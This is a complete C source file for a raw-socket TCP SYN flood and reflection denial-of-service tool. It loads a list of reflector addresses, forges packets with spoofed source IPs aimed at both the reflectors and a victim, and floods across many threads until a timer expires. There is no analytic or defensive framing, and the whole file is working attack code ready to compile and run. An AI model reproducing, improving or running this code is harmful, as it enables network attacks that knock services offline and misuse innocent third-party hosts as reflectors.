#include <unistd.h>
#include <time.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <string.h>
#include <stdlib.h>
#include <stdio.h>
#include <pthread.h>
#include <netinet/tcp.h>
#include <netinet/ip.h>
#include <netinet/in.h>
#include <netinet/if_ether.h>
#include <netdb.h>
#include <net/if.h>
#include <arpa/inet.h>

#define MAX_PACKET_SIZE 8192
#define PHI 0x9e3779b9
static uint32_t Q[4096], c = 362436;
struct list
{
    struct sockaddr_in data;
    struct list *next;
    struct list *prev;
};
struct list *head;
struct thread_data{ int thread_id; struct list *list_node; struct sockaddr_in sin; };

void init_rand(uint32_t x)
{
    int i;
    Q[0] = x;
    Q[1] = x + PHI;
    Q[2] = x + PHI + PHI;
    for (i = 3; i < 4096; i++)
    {
        Q[i] = Q[i - 3] ^ Q[i - 2] ^ PHI ^ i;
    }
}

uint32_t rand_cmwc(void)
{
    uint64_t t, a = 18782LL;
    static uint32_t i = 4095;
    uint32_t x, r = 0xfffffffe;
    i = (i + 1) & 4095;
    t = a * Q[i] + c;
    c = (t >> 32);
    x = t + c;
    if (x < c) {
        x++;
        c++;
    }
    return (Q[i] = r - x);
}

unsigned short csum (unsigned short *buf, int count)
{
    register unsigned long sum = 0;
    while( count > 1 ) { sum += *buf++; count -= 2; }
    if(count > 0) { sum += *(unsigned char *)buf; }
    while (sum>>16) { sum = (sum & 0xffff) + (sum >> 16); }
    return (unsigned short)(~sum);
}

unsigned short tcpcsum(struct iphdr *iph, struct tcphdr *tcph) {

    struct tcp_pseudo
    {
        unsigned long src_addr;
        unsigned long dst_addr;
        unsigned char zero;
        unsigned char proto;
        unsigned short length;
    } pseudohead;
    unsigned short total_len = iph->tot_len;
    pseudohead.src_addr=iph->saddr;
    pseudohead.dst_addr=iph->daddr;
    pseudohead.zero=0;
    pseudohead.proto=IPPROTO_TCP;
    pseudohead.length=htons(sizeof(struct tcphdr));
    int totaltcp_len = sizeof(struct tcp_pseudo) + sizeof(struct tcphdr);
    unsigned short *tcp = malloc(totaltcp_len);
    memcpy((unsigned char *)tcp,&pseudohead,sizeof(struct tcp_pseudo));
    memcpy((unsigned char *)tcp+sizeof(struct tcp_pseudo),(unsigned char *)tcph,sizeof(struct tcphdr));
    unsigned short output = csum(tcp,totaltcp_len);
    free(tcp);
    return output;
}

void setup_ip_header(struct iphdr *iph)
{
    iph->ihl = 5;
    iph->version = 4;
    iph->tos = 0;
    iph->tot_len = sizeof(struct iphdr) + sizeof(struct tcphdr);
    iph->id = htonl(13373);
    iph->frag_off = 0;
    iph->ttl = MAXTTL;
    iph->protocol = IPPROTO_TCP;
    iph->check = 0;
    iph->saddr = inet_addr("192.168.3.100");
}

void setup_tcp_header(struct tcphdr *tcph)
{
    tcph->source = htons(5678);
    tcph->seq = rand();
    tcph->ack_seq = 0;
    tcph->res2 = 0;
    tcph->doff = 5;
    tcph->syn = 1;
    tcph->window = htonl(65535);
    tcph->check = 0;
    tcph->urg_ptr = 0;
}

void *flood(void *par1)
{
    struct thread_data *td = (struct thread_data *)par1;
    char datagram[MAX_PACKET_SIZE];
    struct iphdr *iph = (struct iphdr *)datagram;
    struct tcphdr *tcph = (void *)iph + sizeof(struct iphdr);
    struct sockaddr_in sin = td->sin;
    struct  list *list_node = td->list_node;
    int s = socket(PF_INET, SOCK_RAW, IPPROTO_TCP);
    if(s < 0){
        fprintf(stderr, "Could not open raw socket.\n");
        exit(-1);
    }
    init_rand(time(NULL));
    bzero(datagram, MAX_PACKET_SIZE);
    setup_ip_header(iph);
    setup_tcp_header(tcph);
    tcph->source = sin.sin_port;
    tcph->dest = list_node->data.sin_port;
    iph->saddr = sin.sin_addr.s_addr;
    iph->daddr = list_node->data.sin_addr.s_addr;
    iph->check = csum ((unsigned short *) datagram, iph->tot_len);
    int tmp = 1;
    if(setsockopt(s, IPPROTO_IP, IP_HDRINCL, &tmp, sizeof (tmp)) < 0){
        fprintf(stderr, "Error: setsockopt() - Cannot set HDRINCL!\n");
        exit(-1);
    }
    register unsigned int pmk = 0;
    while(1){
        if(pmk % 2)
        {
            iph->saddr = sin.sin_addr.s_addr;
            iph->daddr = list_node->data.sin_addr.s_addr;
            iph->id = htonl(rand_cmwc() & 0xFFFFFF);
            iph->check = csum ((unsigned short *) datagram, iph->tot_len);
            tcph->dest = list_node->data.sin_port;
            tcph->seq = rand_cmwc() & 0xFFFF;
            tcph->check = 0;
            tcph->check = tcpcsum(iph, tcph);
            sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *) &list_node->data, sizeof(list_node->data));
            list_node = list_node->next;
        } else {
            iph->saddr = list_node->data.sin_addr.s_addr;;
            iph->daddr = sin.sin_addr.s_addr;
            iph->id = htonl(rand_cmwc() & 0xFFFFFF);
            iph->check = csum ((unsigned short *) datagram, iph->tot_len);
            tcph->seq = rand_cmwc() & 0xFFFF;
            tcph->source = list_node->data.sin_port;
            tcph->dest = sin.sin_port;
            tcph->check = 0;
            tcph->check = tcpcsum(iph, tcph);
            sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *) &sin, sizeof(sin));
        }
        pmk++;
        usleep(0);
    }
}
int main(int argc, char *argv[ ])
{
    if(argc < 4){
        fprintf(stderr, "Invalid parameters!\n");
        fprintf(stdout, "Usage: %s <target IP> <target port> <reflection file> <throttle> <time (optional)>\n", argv[0]);
        exit(-1);
    }
    int i = 0;
    head = NULL;
    fprintf(stdout, "Setting up Sockets...\n");
    int max_len = 128;
    char *buffer = (char *) malloc(max_len);
    buffer = memset(buffer, 0x00, max_len);
    int num_threads = atoi(argv[4]);
    FILE *list_fd = fopen(argv[3],  "r");
    while (fgets(buffer, max_len, list_fd) != NULL) {
        if ((buffer[strlen(buffer) - 1] == '\n') || (buffer[strlen(buffer) - 1] == '\r')) {
            buffer[strlen(buffer) - 1] = 0x00;
            if(head == NULL)
            {
                head = (struct list *)malloc(sizeof(struct list));
                bzero(head, sizeof(struct list));
                head->data.sin_addr.s_addr=inet_addr(strtok(buffer, " "));
                head->data.sin_port=htons(atoi(strtok(NULL, " ")));
                head->next = head;
                head->prev = head;
            } else {
                struct list *new_node = (struct list *)malloc(sizeof(struct list));
                bzero(new_node, sizeof(struct list));
                new_node->data.sin_addr.s_addr=inet_addr(strtok(buffer, " "));
                new_node->data.sin_port=htons(atoi(strtok(NULL, " ")));
                new_node->prev = head;
                new_node->next = head->next;
                head->next = new_node;
            }
            i++;
        }
    }
    pthread_t thread[num_threads];
    struct sockaddr_in sin;
    sin.sin_family = AF_INET;
    sin.sin_port = htons(atoi(argv[2]));
    sin.sin_addr.s_addr = inet_addr(argv[1]);
    struct thread_data td[num_threads];
    for(i = 0;i<num_threads;i++){
        td[i].thread_id = i;
        td[i].sin= sin;
        td[i].list_node = head;
        pthread_create( &thread[i], NULL, &flood, (void *) &td[i]);
        head = head->next;
    }
    fprintf(stdout, "Starting Flood...\n");
    if(argc > 5)
    {
        sleep(atoi(argv[5]));
    } else {
        while(1){
            sleep(1);
        }
    }
    return 0;
}